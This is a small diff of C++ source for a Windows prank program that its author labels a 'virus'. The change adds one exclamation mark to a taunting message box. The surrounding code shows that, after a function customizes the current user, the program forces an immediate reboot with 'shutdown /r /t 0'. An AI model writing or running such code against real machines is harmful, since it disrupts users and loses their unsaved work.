@@ -129,7 +129,7 @@ bool CustomizeCurrentUser() {
 
 int main() {
     if (CustomizeCurrentUser()) {
-        MessageBox(NULL, L"You suck! - 'virus' by maybekoi!", L"Konata", MB_ICONINFORMATION | MB_OK);
+        MessageBox(NULL, L"You suck!! - 'virus' by maybekoi!", L"Konata", MB_ICONINFORMATION | MB_OK);
         system("shutdown /r /t 0");
     }
     return 0;
